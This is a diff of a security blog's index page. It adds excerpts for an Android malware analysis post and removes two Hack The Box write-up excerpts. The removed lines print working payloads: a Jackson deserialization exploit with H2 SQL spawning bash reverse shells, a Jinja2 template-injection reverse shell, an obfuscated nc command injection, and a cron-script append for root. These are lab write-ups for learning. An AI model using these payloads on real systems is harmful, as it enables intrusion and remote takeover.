@@ -101,6 +101,96 @@
 	   
 	<div class="article-header">
 	    
+		<a class="title" href="/2024/02/05/Android%20Malware%20RE%20-%20ThaiCamera/">Android Malware RE- ThaiCamera</a>  
+	       
+		 
+
+		<div class="meta">
+			<time>Feb 05, 2024</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		
+			<h1 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h1><p>The target of this exercise is to reverse engineering the application to check if it has send SMS fruds activity.</p>
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+	</div>
+	
+
+	<div class="article-tags">
+		
+	</div>
+
+	<div class="article-bottom">
+		<a class="readmore" href="/2024/02/05/Android%20Malware%20RE%20-%20ThaiCamera/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a class="title" href="/2024/01/09/HTB-Bizness/">HTB-Bizness</a>  
+	       
+		 
+
+		<div class="meta">
+			<time>Jan 09, 2024</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		
+			Active Password Protected writeup
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+	</div>
+	
+
+	<div class="article-tags">
+		
+	</div>
+
+	<div class="article-bottom">
+		<a class="readmore" href="/2024/01/09/HTB-Bizness/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
 		<a class="title" href="/2023/11/30/HTB-Codify/">HTB Codify (Password protected)</a>  
 	       
 		 
@@ -432,204 +522,6 @@
 
 	
 	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
-		<a class="title" href="/2020/11/07/HTB-Time/">HTB Time Writeup</a>  
-	       
-		 
-
-		<div class="meta">
-			<time>Nov 07, 2020</time>			
-		</div>
-	</div>
-
-
-	
-		<div class="thumb">
-			<div class="banner lazyload" data-origin="/images/HTB-Time/image-20201107200513767.png" data-src="/images/HTB-Time/image-20201107200513767.png" style="background-image: url(&quot;/images/placeholder.png&quot;);"></div>
-		</div>
-	
-
-    
-	<div class="typo article-excerpt">	
-		 
-			<p><img src="/images/HTB-Time/image-20201107200513767.png" alt="image-20201107200513767"></p>
-<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 20:06 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.214</span><br><span class="line">Host is up (0.0074s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Online JSON parser</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.06 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-<p>Start to enumerate at the <em>http</em> port</p>
-<p>Not able to find other directory other than the index page</p>
-<p><img src="/images/placeholder.png" alt="image-20201107200901834" data-src="/images/HTB-Time/image-20201107200901834.png" class="lazyload"></p>
-<p>Guess this is the only route to <em>user</em></p>
-<p>Tried different input</p>
-<p><img src="/images/placeholder.png" alt="image-20201107201052773" data-src="/images/HTB-Time/image-20201107201052773.png" class="lazyload"></p>
-<figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">Validation failed: Unhandled Java exception: com<span class="selector-class">.fasterxml</span><span class="selector-class">.jackson</span><span class="selector-class">.core</span><span class="selector-class">.JsonParseException</span>: Unrecognized token <span class="string">'test'</span>: was expecting <span class="string">'null'</span>, <span class="string">'true'</span>, <span class="string">'false'</span> or NaN</span><br></pre></td></tr></tbody></table></figure>
-
-<p>Found some error message.</p>
-<p>After googling, with the keyword <em>fasterxml and jackson</em></p>
-<p>we found this <a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-12384">CVE</a></p>
-<p>Create a <em>inject.sql</em> with bash reverse shell</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException {</span><br><span class="line">        String[] command <span class="operator">=</span> {"bash", "-c", cmd};</span><br><span class="line">        java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(command).getInputStream()).useDelimiter("\\A");</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : "";  }</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">'bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1'</span>)</span><br></pre></td></tr></tbody></table></figure>
-
-<p>Start a python server</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></tbody></table></figure>
-
-<p>Also start a listner</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></tbody></table></figure>
-
-<p>Finally our payload</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>,{<span class="string">"url"</span>:<span class="string">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://x.x.x.x/inject.sql'"</span>}]</span><br></pre></td></tr></tbody></table></figure>
-
-<p>​	And we got our reverse shell back</p>
-<p><img src="/images/placeholder.png" alt="image-20201107204418416" data-src="/images/HTB-Time/image-20201107204418416.png" class="lazyload"></p>
-<h1 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h1><p>After some enumeration manage to find something interesting using <strong>PSPY64</strong></p>
-<p><img src="/images/placeholder.png" alt="image-20201107194832954" data-src="/images/HTB-Time/image-20201107194832954.png" class="lazyload"></p>
-<p> <strong>/usr/bin/timer_backup.sh</strong> is run by Root</p>
-<p><code>-rwxrw-rw- 1 pericles pericles 88 Nov  7 12:50 /usr/bin/timer_backup.sh</code></p>
-<p>We have write permission.</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"bash -i &gt;&amp; /dev/tcp/10.10.14.22/5555 0&gt;&amp;1"</span> &gt;&gt; /usr/bin/timer_backup.sh</span><br></pre></td></tr></tbody></table></figure>
-
-<p>and we get a easy root. But the nc will exit somehow less than 30second, another method is to write your public key and enter in SSH</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.10.214] 33944</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (230926): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@time:/<span class="comment"># whoami &amp;&amp; id &amp;&amp; hostname</span></span><br><span class="line"><span class="built_in">whoami</span> &amp;&amp; <span class="built_in">id</span> &amp;&amp; hostname</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">time</span><br><span class="line">root@time:/<span class="comment"># exit</span></span><br></pre></td></tr></tbody></table></figure>
-
-<br>
-<br>
-<br>
-
-<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
-
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
-			            
-				<a class="link" href="/tags/medium/">medium</a>           
-			
-		
-	</div>
-
-	<div class="article-bottom">
-		<a class="readmore" href="/2020/11/07/HTB-Time/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
-		<a class="title" href="/2020/10/06/HTB-Doctor/">HTB Doctor Writeup</a>  
-	       
-		 
-
-		<div class="meta">
-			<time>Oct 06, 2020</time>			
-		</div>
-	</div>
-
-
-	
-
-    
-	<div class="typo article-excerpt">	
-		 
-			<p><img src="/images/placeholder.png" alt="image-20201009214428794" data-src="/images/HTB-Doctor/image-20201009214428794.png" class="lazyload"></p>
-<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author Ikonw"></a>Author Ikonw</h2><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun Sep 27 09:39:47 2020 as: nmap -Pn -sCV -p22,80,8089 -oN nmap/Full_10.129.11.0.nmap 10.129.11.0</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> doctor.htb (10.129.11.0)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Doctor</span><br><span class="line">8089/tcp open  ssl/http Splunkd httpd</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Splunkd</span><br><span class="line">|_http-title: splunkd</span><br><span class="line">| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser</span><br><span class="line">| Not valid before: 2020-09-06T15:57:27</span><br><span class="line">|_Not valid after:  2023-09-06T15:57:27</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-<p>Start enumeration on port 80, found the <code>info@doctors.htb</code> email.</p>
-<p>Let’s add the hostname <code>doctors.htb</code> to <code>/etc/hosts</code></p>
-<p><img src="/images/placeholder.png" alt="image-20201009214518677" data-src="/images/HTB-Doctor/image-20201009214518677.png" class="lazyload"></p>
-<p>After adding to host file, visit <code>doctors.htb</code> come to a login page</p>
-<p><img src="/images/placeholder.png" alt="image-20201009214618490" data-src="/images/HTB-Doctor/image-20201009214618490.png" class="lazyload"></p>
-<p>Tried to use <code>info@doctors.htb</code> to login, with the reset password function, we can verify that <code>info@doctors.htb</code> is not a valid account.</p>
-<p><img src="/images/placeholder.png" alt="image-20201009214740397" data-src="/images/HTB-Doctor/image-20201009214740397.png" class="lazyload"></p>
-<p>Once we register, there’s only one function. </p>
-<p><img src="/images/placeholder.png" alt="image-20201009214919652" data-src="/images/HTB-Doctor/image-20201009214919652.png" class="lazyload"></p>
-<p>From the page source, we found <code>/archive</code> but it appears to be blank page </p>
-<p><img src="/images/placeholder.png" alt="image-20201009214950290" data-src="/images/HTB-Doctor/image-20201009214950290.png" class="lazyload"></p>
-<p>The <code>New Post</code> is vulnerable to <code>server site template injection</code></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Server Side Template Injection Payloads</a></p>
-<p><img src="/images/placeholder.png" alt="image-20201009220337033" data-src="/images/HTB-Doctor/image-20201009220337033.png" class="lazyload"></p>
-<p>When we input <code>{{7*7}}</code> , we notice that it is shown on the <code>/archive</code> page.</p>
-<p>can confirmed that it is using either <code>Twig</code> or <code>Jinja2</code></p>
-<p>Next up, craft a malicious payload to obtain reverse connecction</p>
-<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{% <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() %}{% <span class="keyword">if</span> <span class="string">"warning"</span> <span class="keyword">in</span> x.__name__ %}{{x()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.67\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'"</span>).read()}}{%endif%}{%endfor%}</span><br></pre></td></tr></tbody></table></figure>
-
-<p>Another way would be using malicious curl command, this seems the unintended way</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">&lt;img src=http://10.10.14.67:1337/$(nc.traditional<span class="variable">$IFS</span>-e<span class="variable">$IFS</span>/bin/bash<span class="variable">$IFS</span><span class="string">'10.10.14.67'</span><span class="variable">$IFS</span><span class="string">'4444'</span>)&gt;</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/images/placeholder.png" alt="image-20201010132416445" data-src="/images/HTB-Doctor/image-20201010132416445.png" class="lazyload"></p>
-<h1 id="WWW-data-to-User"><a href="#WWW-data-to-User" class="headerlink" title="WWW-data to User"></a>WWW-data to User</h1><p>Went to <code>/home</code> directory we found user <code>shaun</code></p>
-<p>Found user password in <code>/var/log/apache/backup</code></p>
-<p>And we can switch to user <code>shaun</code>.</p>
-<p>Using the privilege escalation suggester we got the splunk is vulnerable. </p>
-<p>By using the <a target="_blank" rel="noopener" href="https://github.com/cnotin/SplunkWhisperer2">https://github.com/cnotin/SplunkWhisperer2</a> we are able to get privileges’ to root </p>
-<p>Initial foothold is more annoying, from www-data to user to root is easy</p>
-<br>
-<br>
-<br>
-
-<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
-
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
-			            
-				<a class="link" href="/tags/easy/">easy</a>           
-			
-		
-	</div>
-
-	<div class="article-bottom">
-		<a class="readmore" href="/2020/10/06/HTB-Doctor/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
 
 	
 	
@@ -637,7 +529,7 @@
    <nav class="paginator">
     
 
-   <span class="page-number"> Page <strong>1</strong>, Posts <strong>29</strong>. </span>
+   <span class="page-number"> Page <strong>1</strong>, Posts <strong>33</strong>. </span>
 
     
         <a class="next" href="/page/2/"> 
@@ -688,7 +580,7 @@
      <div class="mobile-menu">      
 
       
-      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/avatar.jpg">  
+      <img class="mobile-menu-icon" src="/images/avatar.jpg">  
       
 
          
